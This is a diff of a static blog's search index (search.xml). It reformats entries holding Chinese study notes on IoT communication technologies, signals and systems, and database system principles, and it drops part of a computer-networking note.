@@ -1,825 +1,222 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>IOT学习笔记</title>
-    <url>/2020/03/14/IOT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Day-1"><a href="#Day-1" class="headerlink" title="Day_1"></a>Day_1</h1><hr>
-<h2 id="1-1初识物联网（Internet-of-Things）"><a href="#1-1初识物联网（Internet-of-Things）" class="headerlink" title="1.1初识物联网（Internet of Things）"></a>1.1初识物联网（Internet of Things）</h2><p>早期概念定义：指依托RFID（射频识别）技术和设备，按约定的通信协议和互联网结合，使物品信息实现智能化识别和管理，实现物品信息互联，可交换和共享而形成的网络。</p>
-<p>2005 引用物联网概念</p>
-<p>2008 IBM提出“智慧地球”</p>
-<p>2009 “感知中国”</p>
-<p>2013 工业4.0</p>
-<p>2015 “中国制造2025”发布</p>
-<p>2016 物联网生态元年 云管端实现闭环</p>
-<ol>
-<li><p>按照云-管-端逻辑体系划分</p>
-<ul>
-<li>应用层：负责数据呈现及客户交互</li>
-<li>平台层：负责设备通信管理、数据存储、业务规划等</li>
-<li>网络层：负责终端接入和数据传输</li>
-<li>感知层：负责信息收集和信号处理</li>
-</ul>
-</li>
-<li><p>按照垂直行业划分可划分为</p>
-<ul>
-<li>公共事业物联网</li>
-<li>车联网</li>
-<li>工业物联网</li>
-<li>智慧家庭物联网</li>
-</ul>
-</li>
-</ol>
-<hr>
-<table>
-<thead>
-<tr>
-<th align="center">通信技术</th>
-<th align="center">特点</th>
-<th align="center">业务应用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">4G,5G,LTE-V</td>
-<td align="center">输出速率&gt;10Mbps,功耗较高，成本高</td>
-<td align="center">车联网，视频监控，智能机器</td>
-</tr>
-<tr>
-<td align="center">eMTC，GPRS</td>
-<td align="center">输出速率~1Mbps,功耗较低，成本低</td>
-<td align="center">智能穿戴设备，梯联网，电子公告，无线ATM</td>
-</tr>
-<tr>
-<td align="center">NB-IoT</td>
-<td align="center">输出速率&lt;100kbps</td>
-<td align="center">远程秒表，智能停车，智慧农业</td>
-</tr>
-</tbody></table>
-<h2 id="1-2可靠的有线通信"><a href="#1-2可靠的有线通信" class="headerlink" title="1.2可靠的有线通信"></a>1.2可靠的有线通信</h2><ol>
-<li><code>以太网</code>：现有局域网采用的最通用的通信协议标准，家庭路由器宽带技术就涉及到以太网技术。<ul>
-<li>标准以太网</li>
-<li>快速以太网</li>
-<li>10G以太网</li>
-</ul>
-</li>
-</ol>
-<hr>
-<p>2.<code>RS-232</code>：EIA制定的异步传输接口，主要应用于监视与控制系统</p>
-<ul>
-<li>DB-9，个人计算机对应接口COM2</li>
-<li>DB-25，个人计算机对应接口COM1</li>
-<li>传输方式：不平衡传输，单端通讯</li>
-<li>传输距离：不超过20m</li>
-<li>通信数量：一对一通信</li>
-</ul>
-<hr>
-<p>3.<code>RS-485</code>：为了解决RS-232不可以联网的问题</p>
-<ul>
-<li>传输方式：平衡传输，差分传输</li>
-<li>传输距离：几十到上千米</li>
-<li>通信数量：总线允许连接128个收发器</li>
-</ul>
-<hr>
-<p>4.<code>M-Bus</code>（Meter Bus）：是指户用仪表总线用于非电力户用仪表传输的欧洲总线标准，专门为消耗测量仪器和计数器传送信息的数据总线设计。M-Bus在建筑物和工业能源消耗数据采集有多方面的应用，M- Bus串行通信方式的总线型拓扑结构图适合公用事业仪表的可靠、低成本的组网要求。</p>
-<ul>
-<li>管理层 ：对任意层次进行管理</li>
-<li>应用层</li>
-<li><del>表示层</del></li>
-<li><del>会话层</del></li>
-<li><del>传输层</del></li>
-<li>网络层</li>
-<li>链路层</li>
-<li>物理层</li>
-</ul>
-<hr>
-<ol start="5">
-<li><code>PLC</code>（Power Line Communication）：指利用电力线传输数据和媒体信号的一种通信方式 。该技术是把载有信息的高频加载于电流然后用电线传输接受信息的适配器再把高频从电流中分离出来并传送到计算机或电话以实现信息传递。</li>
-</ol>
-<p>优点:稳定性强，可靠性高</p>
-<p>缺点:受限于传输媒介</p>
-<h2 id="1-3无线通信"><a href="#1-3无线通信" class="headerlink" title="1.3无线通信"></a>1.3无线通信</h2><h3 id="1-3-1短距无线通讯技术"><a href="#1-3-1短距无线通讯技术" class="headerlink" title="1.3.1短距无线通讯技术"></a>1.3.1短距无线通讯技术</h3><hr>
-<p>1.<code>Bluetooth</code>：是爱立信用来替代RS-232的方案</p>
-<ul>
-<li>大容量</li>
-<li>近距离</li>
-<li>无线数字通信技术标准 </li>
-</ul>
-<p>主要用于移动设备和楼宇个人域网之间的短距离数据交换。</p>
-<ul>
-<li>2.4-2.485GHz的ISM波段的无线电波</li>
-<li>最高数据传输速率1Mbps</li>
-<li>最大传输距离:为10厘米一10米的数据传输( 通过增加发射功率传输距离可达到100米)</li>
-</ul>
-<p>优点：速率快、低功耗，安全性高</p>
-<p>缺点：网络节点少，不适合多点布控</p>
-<hr>
-<p>2.<code>Wi-Fi</code>是一种允许电子设备连接到一个无线局域网( WLAN)的技术，通常使用2.4G UHF或5G SHF ISM射频频段。</p>
-<p>优点：覆盖范围广，数据传输速率快</p>
-<p>缺点：传输安全性不好，稳定性差，功耗略高</p>
-<hr>
-<p>3.<code>ZigBee</code>:是基于IEEE802.15.4标准的，低功耗局域网协议</p>
-<ul>
-<li>简单</li>
-<li>使用方便</li>
-<li>工作可靠</li>
-<li>价格低</li>
-</ul>
-<p>优点：近距离、低复杂度、自组织、低功耗、低数据速率</p>
-<p>缺点：物体阻挡后信号会衰减、 不同芯片兼容性较差，网络较灵活，不易维护</p>
-<hr>
-<p>4.<code>Z-wave</code>是一种新兴的基于射频的、低成本、低功耗、高可靠的短距离无线通信技术。Z-Wave技术设计用于住宅照明商业控制以及状态读取应用。</p>
-<p>优点：网络结构简单，低功耗，低成本，可靠性高</p>
-<p>缺点：速率较低， 标准不开放，芯片只能通过Sigma Designs这唯一来源获取</p>
-<hr>
-<h3 id="1-3-2蜂窝移动通信"><a href="#1-3-2蜂窝移动通信" class="headerlink" title="1.3.2蜂窝移动通信"></a>1.3.2蜂窝移动通信</h3><p>1.<code>2G,3G,4G,5G</code></p>
-<p>是采用蜂窝无线组网方式，在终端和网络设备之间通过无线通道连接起来，进而实现用户在活动中可相互通信。其主要特征是终端的移动性，并具有越区切换和跨本地网自动漫游功能。<br>蜂窝移动通信业务是指经过由基站子系统和移动交换子系统等设备组成蜂窝移动通信网提供的话音、数据、视频图像等业务。</p>
-<hr>
-<h2 id="1-4万物互联的LPWA"><a href="#1-4万物互联的LPWA" class="headerlink" title="1.4万物互联的LPWA"></a>1.4万物互联的LPWA</h2><p><code>LPWA</code>(Low power Wide Area)低功耗广域网</p>
-<p>1.<code>SigFox</code>网络利用了超窄带，UNB技术。整个Sigfox网络拓扑是一个可扩展的、高容量的网络，具有非常低的能源消耗，同时保持简单和易于部署的基于星型单元的基础设施。</p>
-<ul>
-<li>功耗低</li>
-<li>连接稳定</li>
-</ul>
-<p>2.<code>NB-IoT</code>是构建与蜂窝网络的窄带物联网只捎耗大约180KHz的带宽，可直接部署于GSM网络，UMTS网络，LTE网络</p>
-<p>特点：</p>
-<ul>
-<li>覆盖广</li>
-<li>成本低</li>
-<li>连接多</li>
-<li>功耗低</li>
-<li>速率低</li>
-<li>架构优</li>
-</ul>
-<p>3.<code>LoRa</code>是基于开源的MAC层协议的低功耗广域网标准，同时基于Sub-GHz的频段使其更易以较低功耗远距离通信</p>
-<ul>
-<li>LoRa实现远距离</li>
-<li>长电池寿命</li>
-<li>大容量的系统</li>
-<li>进而扩展传感网络</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/IOTDayOne_2.png" alt=""></p>
-<h2 id="1-5第一章总结"><a href="#1-5第一章总结" class="headerlink" title="1.5第一章总结"></a>1.5第一章总结</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/IOT1.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信号与系统学习笔记</title>
-    <url>/2020/03/11/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol>
-<li>连续正弦信号一定是周期信号，而正弦序列不一定是周期序列</li>
-<li>两连续周期信号之和不一定是周期信号，而两周期序列之和一定是周期序列</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>数据库系统原理笔记</title>
-    <url>/2020/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LakePukaki_EN-AU9412206565_1920x1080%20(1).jpg" alt=""></p>
-<h1 id="数据库系统原理"><a href="#数据库系统原理" class="headerlink" title="数据库系统原理"></a>数据库系统原理</h1><h2 id="第1章-数据库系统概述"><a href="#第1章-数据库系统概述" class="headerlink" title="第1章 数据库系统概述"></a>第1章 数据库系统概述</h2><h3 id="1-1数据库的基本概念"><a href="#1-1数据库的基本概念" class="headerlink" title="1.1数据库的基本概念"></a>1.1数据库的基本概念</h3><ul>
-<li><strong>数据Data</strong></li>
-</ul>
-<p>数据库的存储对象，描述事物的符号记录</p>
-<ul>
-<li><strong>数据库(Database,简记为DB)</strong></li>
-</ul>
-<p>DB是<strong>长期存储</strong>在计算机内的、<strong>在组织的</strong>、统一管理的相关数据的集合。DB能为各种用户<strong>共享</strong>，具有<strong>较小冗余度</strong>、数据间联系紧密而又有较高的数据<strong>独立性</strong>和<strong>易拓展</strong>的特点。</p>
-<ul>
-<li><strong>数据库管理系统(DBMS)</strong></li>
-</ul>
-<p>DBMS是一个管理数据库的系统软件,它应具有以下功能:</p>
-<ul>
-<li>数据库定义功能 (提供数据定义语言DDL,即Data Definition Language.用户通过它可以定义数据库中的数据对象)</li>
-<li>数据库操纵功能 (提供数据操纵语言DML, 即Data Manipulation Language.用户通过它可以操zing数据库中的数据,实现增删改查等数据库基本操作)</li>
-<li>数据库的运行管理功能 (提供DCL, 数据库在建立,运用和维护时间由DBMS统一管理,负责数据的安全性,完整性,多用户对数据的并发使用及发生故障后的系统恢复)</li>
-<li>数据库的建立和维护功能 (一般包括数据库初始数据的输入,转换功能,数据库的转储,恢复功能,数据库的重组织功能和性能监视,分析功能)</li>
-</ul>
-<ul>
-<li><strong>数据库系统(DBS)</strong></li>
-</ul>
-<p>指在计算机系统换种引入数据库后构成的计算机应用系统,其中包括:</p>
-<ul>
-<li>数据库(及相关硬件)</li>
-<li>数据库管理员(DBA)和用户</li>
-<li>软件(主要包括操作系统,各种宿主语言,使用程序以及数据库管理系统)</li>
-</ul>
-<blockquote>
-<p>用户-&gt;应用系统-&gt;应用开发工具-&gt;DBMS-&gt;操作系统-&gt;DB</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%931.png" alt=""></p>
-<p>其特点为: <strong>数据结构化,数据共享,冗余度低,可控,独立性高</strong></p>
-<h3 id="1-2数据模型"><a href="#1-2数据模型" class="headerlink" title="1.2数据模型"></a>1.2数据模型</h3><p>在设计数据库的过程中,通常是将客观事物进行抽象转变为数据模型.<br>这里的大概过程为: 客观事物-&gt;概念模型(E-R图)-&gt;数据模型</p>
-<ul>
-<li>实体（Entity）：<br>客观存在并可相互区别的事物称为实体。<br>可以是具体的人、事、物或抽象的概念。</li>
-<li>属性（Attribute）：<br>实体所具有的某一特性称为属性。<br>一个实体可以由若干个属性来刻画。  </li>
-<li>码（Key）：<br>唯一标识实体的属性集称为码。</li>
-<li>实体型（Entity Type）：<br>用实体名及其属性名集合来抽象和刻画同类实体称为<br>实体型</li>
-<li>实体集（Entity Set）：<br>同一类型实体的集合称为实体集</li>
-</ul>
-<p><strong>实体与属性</strong>: 客观上可以相互区分的事物就是实体,一个实体通常具有若干个特征,其中的每一个特征就称为实体的一个属性.</p>
-<p><strong>实体集之间的联系</strong>: 分为实体集内部的联系和实体集之间的联系.</p>
-<ul>
-<li>有一对一(1:1)：如果实体集E1中每个实体至多与实体集E2中的一个实体有联系，反之亦然，那么实体集E1和E2的联系称为”一对一联系“，记为”1：1“。 例子：飞机的座位和乘客之间是1：1联系。</li>
-<li>一对多(1:n)：如果实体集E1中的每个实体可以与实体集E2中任意个（零个或多个）实体间有联系，而E2中每个实体至多和E1中的一个实体有联系，那么称E1对E2的联系是”一对多的联系“，记为”1：N“。 例子：工厂里车间和工人之间是1：N联系。</li>
-<li>多对多(n:n)：如果实体集E1中每个实体可以与实体集E2中任意个（零个或多个）实体间有联系，反之亦然，那么称E1和E2的联系是”多对多联系“，记为”M：N“。 例子：学校里学生和课程之间是M:N联系。</li>
-</ul>
-<p>常见的数据模型:</p>
-<ul>
-<li>层次模型（Hierarchical Model）(可以理解为有向树,简单易操作,缺点为插入删除操作时限制较多)</li>
-<li>网状模型（Network Model）(可以理解为有向图,能够更直接的描述现实世界,但其DDL及其复杂)</li>
-<li>关系模型（Relational Model)(最为主流,数据为一张二维表.缺点为查询不够效率)</li>
-<li>面向对象数据模型（Object Oriented Data Model）(具有很强的模型扩展能力,节省开销,但尚不成熟)</li>
-<li>对象关系数据模型（Object Relational Data Model）</li>
-<li>半结构化数据模型（Semistruture Data Model）</li>
-</ul>
-<h3 id="1-3数据库系统三级结构"><a href="#1-3数据库系统三级结构" class="headerlink" title="1.3数据库系统三级结构"></a>1.3数据库系统三级结构</h3><p>从数据库管理系统的角度看,数据库系统通常采用三级模式结构: 内模式, 概念模式, 外模式</p>
-<p>三级模式结构:</p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>IOT学习笔记</title>
+      <link href="/2020/03/14/IOT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+      <url>/2020/03/14/IOT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Day-1"><a href="#Day-1" class="headerlink" title="Day_1"></a>Day_1</h1><hr><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/IOTIoT_1.jpg" alt=""></p><a id="more"></a><h2 id="1-1初识物联网（Internet-of-Things）"><a href="#1-1初识物联网（Internet-of-Things）" class="headerlink" title="1.1初识物联网（Internet of Things）"></a>1.1初识物联网（Internet of Things）</h2><p>早期概念定义：指依托RFID（射频识别）技术和设备，按约定的通信协议和互联网结合，使物品信息实现智能化识别和管理，实现物品信息互联，可交换和共享而形成的网络。</p><p>2005 引用物联网概念</p><p>2008 IBM提出“智慧地球”</p><p>2009 “感知中国”</p><p>2013 工业4.0</p><p>2015 “中国制造2025”发布</p><p>2016 物联网生态元年 云管端实现闭环</p><ol><li><p>按照云-管-端逻辑体系划分</p><ul><li>应用层：负责数据呈现及客户交互</li><li>平台层：负责设备通信管理、数据存储、业务规划等</li><li>网络层：负责终端接入和数据传输</li><li>感知层：负责信息收集和信号处理</li></ul></li><li><p>按照垂直行业划分可划分为</p><ul><li>公共事业物联网</li><li>车联网</li><li>工业物联网</li><li>智慧家庭物联网</li></ul></li></ol><hr><table><thead><tr><th align="center">通信技术</th><th align="center">特点</th><th align="center">业务应用</th></tr></thead><tbody><tr><td align="center">4G,5G,LTE-V</td><td align="center">输出速率&gt;10Mbps,功耗较高，成本高</td><td align="center">车联网，视频监控，智能机器</td></tr><tr><td align="center">eMTC，GPRS</td><td align="center">输出速率~1Mbps,功耗较低，成本低</td><td align="center">智能穿戴设备，梯联网，电子公告，无线ATM</td></tr><tr><td align="center">NB-IoT</td><td align="center">输出速率&lt;100kbps</td><td align="center">远程秒表，智能停车，智慧农业</td></tr></tbody></table><h2 id="1-2可靠的有线通信"><a href="#1-2可靠的有线通信" class="headerlink" title="1.2可靠的有线通信"></a>1.2可靠的有线通信</h2><ol><li><code>以太网</code>：现有局域网采用的最通用的通信协议标准，家庭路由器宽带技术就涉及到以太网技术。<ul><li>标准以太网</li><li>快速以太网</li><li>10G以太网</li></ul></li></ol><hr><p>2.<code>RS-232</code>：EIA制定的异步传输接口，主要应用于监视与控制系统</p><ul><li>DB-9，个人计算机对应接口COM2</li><li>DB-25，个人计算机对应接口COM1</li><li>传输方式：不平衡传输，单端通讯</li><li>传输距离：不超过20m</li><li>通信数量：一对一通信</li></ul><hr><p>3.<code>RS-485</code>：为了解决RS-232不可以联网的问题</p><ul><li>传输方式：平衡传输，差分传输</li><li>传输距离：几十到上千米</li><li>通信数量：总线允许连接128个收发器</li></ul><hr><p>4.<code>M-Bus</code>（Meter Bus）：是指户用仪表总线用于非电力户用仪表传输的欧洲总线标准，专门为消耗测量仪器和计数器传送信息的数据总线设计。M-Bus在建筑物和工业能源消耗数据采集有多方面的应用，M- Bus串行通信方式的总线型拓扑结构图适合公用事业仪表的可靠、低成本的组网要求。</p><ul><li>管理层 ：对任意层次进行管理</li><li>应用层</li><li><del>表示层</del></li><li><del>会话层</del></li><li><del>传输层</del></li><li>网络层</li><li>链路层</li><li>物理层</li></ul><hr><ol start="5"><li><code>PLC</code>（Power Line Communication）：指利用电力线传输数据和媒体信号的一种通信方式 。该技术是把载有信息的高频加载于电流然后用电线传输接受信息的适配器再把高频从电流中分离出来并传送到计算机或电话以实现信息传递。</li></ol><p>优点:稳定性强，可靠性高</p><p>缺点:受限于传输媒介</p><h2 id="1-3无线通信"><a href="#1-3无线通信" class="headerlink" title="1.3无线通信"></a>1.3无线通信</h2><h3 id="1-3-1短距无线通讯技术"><a href="#1-3-1短距无线通讯技术" class="headerlink" title="1.3.1短距无线通讯技术"></a>1.3.1短距无线通讯技术</h3><hr><p>1.<code>Bluetooth</code>：是爱立信用来替代RS-232的方案</p><ul><li>大容量</li><li>近距离</li><li>无线数字通信技术标准 </li></ul><p>主要用于移动设备和楼宇个人域网之间的短距离数据交换。</p><ul><li>2.4-2.485GHz的ISM波段的无线电波</li><li>最高数据传输速率1Mbps</li><li>最大传输距离:为10厘米一10米的数据传输( 通过增加发射功率传输距离可达到100米)</li></ul><p>优点：速率快、低功耗，安全性高</p><p>缺点：网络节点少，不适合多点布控</p><hr><p>2.<code>Wi-Fi</code>是一种允许电子设备连接到一个无线局域网( WLAN)的技术，通常使用2.4G UHF或5G SHF ISM射频频段。</p><p>优点：覆盖范围广，数据传输速率快</p><p>缺点：传输安全性不好，稳定性差，功耗略高</p><hr><p>3.<code>ZigBee</code>:是基于IEEE802.15.4标准的，低功耗局域网协议</p><ul><li>简单</li><li>使用方便</li><li>工作可靠</li><li>价格低</li></ul><p>优点：近距离、低复杂度、自组织、低功耗、低数据速率</p><p>缺点：物体阻挡后信号会衰减、 不同芯片兼容性较差，网络较灵活，不易维护</p><hr><p>4.<code>Z-wave</code>是一种新兴的基于射频的、低成本、低功耗、高可靠的短距离无线通信技术。Z-Wave技术设计用于住宅照明商业控制以及状态读取应用。</p><p>优点：网络结构简单，低功耗，低成本，可靠性高</p><p>缺点：速率较低， 标准不开放，芯片只能通过Sigma Designs这唯一来源获取</p><hr><h3 id="1-3-2蜂窝移动通信"><a href="#1-3-2蜂窝移动通信" class="headerlink" title="1.3.2蜂窝移动通信"></a>1.3.2蜂窝移动通信</h3><p>1.<code>2G,3G,4G,5G</code></p><p>是采用蜂窝无线组网方式，在终端和网络设备之间通过无线通道连接起来，进而实现用户在活动中可相互通信。其主要特征是终端的移动性，并具有越区切换和跨本地网自动漫游功能。<br>蜂窝移动通信业务是指经过由基站子系统和移动交换子系统等设备组成蜂窝移动通信网提供的话音、数据、视频图像等业务。</p><hr><h2 id="1-4万物互联的LPWA"><a href="#1-4万物互联的LPWA" class="headerlink" title="1.4万物互联的LPWA"></a>1.4万物互联的LPWA</h2><p><code>LPWA</code>(Low power Wide Area)低功耗广域网</p><p>1.<code>SigFox</code>网络利用了超窄带，UNB技术。整个Sigfox网络拓扑是一个可扩展的、高容量的网络，具有非常低的能源消耗，同时保持简单和易于部署的基于星型单元的基础设施。</p><ul><li>功耗低</li><li>连接稳定</li></ul><p>2.<code>NB-IoT</code>是构建与蜂窝网络的窄带物联网只捎耗大约180KHz的带宽，可直接部署于GSM网络，UMTS网络，LTE网络</p><p>特点：</p><ul><li>覆盖广</li><li>成本低</li><li>连接多</li><li>功耗低</li><li>速率低</li><li>架构优</li></ul><p>3.<code>LoRa</code>是基于开源的MAC层协议的低功耗广域网标准，同时基于Sub-GHz的频段使其更易以较低功耗远距离通信</p><ul><li>LoRa实现远距离</li><li>长电池寿命</li><li>大容量的系统</li><li>进而扩展传感网络</li></ul><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/IOTDayOne_2.png" alt=""></p><h2 id="1-5第一章总结"><a href="#1-5第一章总结" class="headerlink" title="1.5第一章总结"></a>1.5第一章总结</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/IOT1.png" alt=""></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信号与系统学习笔记</title>
+      <link href="/2020/03/11/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+      <url>/2020/03/11/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol><li>连续正弦信号一定是周期信号，而正弦序列不一定是周期序列</li><li>两连续周期信号之和不一定是周期信号，而两周期序列之和一定是周期序列</li></ol>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>数据库系统原理笔记</title>
+      <link href="/2020/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/"/>
+      <url>/2020/03/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LakePukaki_EN-AU9412206565_1920x1080%20(1).jpg" alt=""></p><h1 id="数据库系统原理"><a href="#数据库系统原理" class="headerlink" title="数据库系统原理"></a>数据库系统原理</h1><h2 id="第1章-数据库系统概述"><a href="#第1章-数据库系统概述" class="headerlink" title="第1章 数据库系统概述"></a>第1章 数据库系统概述</h2><h3 id="1-1数据库的基本概念"><a href="#1-1数据库的基本概念" class="headerlink" title="1.1数据库的基本概念"></a>1.1数据库的基本概念</h3><ul><li><strong>数据Data</strong></li></ul><p>数据库的存储对象，描述事物的符号记录</p><ul><li><strong>数据库(Database,简记为DB)</strong></li></ul><p>DB是<strong>长期存储</strong>在计算机内的、<strong>在组织的</strong>、统一管理的相关数据的集合。DB能为各种用户<strong>共享</strong>，具有<strong>较小冗余度</strong>、数据间联系紧密而又有较高的数据<strong>独立性</strong>和<strong>易拓展</strong>的特点。</p><ul><li><strong>数据库管理系统(DBMS)</strong></li></ul><p>DBMS是一个管理数据库的系统软件,它应具有以下功能:</p><ul><li>数据库定义功能 (提供数据定义语言DDL,即Data Definition Language.用户通过它可以定义数据库中的数据对象)</li><li>数据库操纵功能 (提供数据操纵语言DML, 即Data Manipulation Language.用户通过它可以操zing数据库中的数据,实现增删改查等数据库基本操作)</li><li>数据库的运行管理功能 (提供DCL, 数据库在建立,运用和维护时间由DBMS统一管理,负责数据的安全性,完整性,多用户对数据的并发使用及发生故障后的系统恢复)</li><li>数据库的建立和维护功能 (一般包括数据库初始数据的输入,转换功能,数据库的转储,恢复功能,数据库的重组织功能和性能监视,分析功能)</li></ul><ul><li><strong>数据库系统(DBS)</strong></li></ul><p>指在计算机系统换种引入数据库后构成的计算机应用系统,其中包括:</p><ul><li>数据库(及相关硬件)</li><li>数据库管理员(DBA)和用户</li><li>软件(主要包括操作系统,各种宿主语言,使用程序以及数据库管理系统)</li></ul><blockquote><p>用户-&gt;应用系统-&gt;应用开发工具-&gt;DBMS-&gt;操作系统-&gt;DB</p></blockquote><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%931.png" alt=""></p><p>其特点为: <strong>数据结构化,数据共享,冗余度低,可控,独立性高</strong></p><h3 id="1-2数据模型"><a href="#1-2数据模型" class="headerlink" title="1.2数据模型"></a>1.2数据模型</h3><p>在设计数据库的过程中,通常是将客观事物进行抽象转变为数据模型.<br>这里的大概过程为: 客观事物-&gt;概念模型(E-R图)-&gt;数据模型</p><ul><li>实体（Entity）：<br>客观存在并可相互区别的事物称为实体。<br>可以是具体的人、事、物或抽象的概念。</li><li>属性（Attribute）：<br>实体所具有的某一特性称为属性。<br>一个实体可以由若干个属性来刻画。  </li><li>码（Key）：<br>唯一标识实体的属性集称为码。</li><li>实体型（Entity Type）：<br>用实体名及其属性名集合来抽象和刻画同类实体称为<br>实体型</li><li>实体集（Entity Set）：<br>同一类型实体的集合称为实体集</li></ul><p><strong>实体与属性</strong>: 客观上可以相互区分的事物就是实体,一个实体通常具有若干个特征,其中的每一个特征就称为实体的一个属性.</p><p><strong>实体集之间的联系</strong>: 分为实体集内部的联系和实体集之间的联系.</p><ul><li>有一对一(1:1)：如果实体集E1中每个实体至多与实体集E2中的一个实体有联系，反之亦然，那么实体集E1和E2的联系称为”一对一联系“，记为”1：1“。 例子：飞机的座位和乘客之间是1：1联系。</li><li>一对多(1:n)：如果实体集E1中的每个实体可以与实体集E2中任意个（零个或多个）实体间有联系，而E2中每个实体至多和E1中的一个实体有联系，那么称E1对E2的联系是”一对多的联系“，记为”1：N“。 例子：工厂里车间和工人之间是1：N联系。</li><li>多对多(n:n)：如果实体集E1中每个实体可以与实体集E2中任意个（零个或多个）实体间有联系，反之亦然，那么称E1和E2的联系是”多对多联系“，记为”M：N“。 例子：学校里学生和课程之间是M:N联系。</li></ul><p>常见的数据模型:</p><ul><li>层次模型（Hierarchical Model）(可以理解为有向树,简单易操作,缺点为插入删除操作时限制较多)</li><li>网状模型（Network Model）(可以理解为有向图,能够更直接的描述现实世界,但其DDL及其复杂)</li><li>关系模型（Relational Model)(最为主流,数据为一张二维表.缺点为查询不够效率)</li><li>面向对象数据模型（Object Oriented Data Model）(具有很强的模型扩展能力,节省开销,但尚不成熟)</li><li>对象关系数据模型（Object Relational Data Model）</li><li>半结构化数据模型（Semistruture Data Model）</li></ul><h3 id="1-3数据库系统三级结构"><a href="#1-3数据库系统三级结构" class="headerlink" title="1.3数据库系统三级结构"></a>1.3数据库系统三级结构</h3><p>从数据库管理系统的角度看,数据库系统通常采用三级模式结构: 内模式, 概念模式, 外模式</p><p>三级模式结构:</p>]]></content>
+      
+      
       <categories>
-        <category>学习笔记</category>
+          
+          <category> 学习笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机网络笔记[概述]</title>
-    <url>/2020/02/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/2020-2-24ZoomOut_ZH-CN4471982075_1920x1080.jpg" alt=""></p>
-<a id="more"></a>
-
-<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 - 概述"></a>第一章 - 概述</h1><p>21世纪的重要特征：<code>数字化</code>、<code>网络化</code>、<code>信息化</code>，它是一个<code>以网络为核心的信息时代</code>。<br>三网：<code>电信网络</code>，<code>有线电视网络</code>，<code>计算机网络</code></p>
-<p>因特网起源于美国，是世界上最大的国际性计算机互联网。</p>
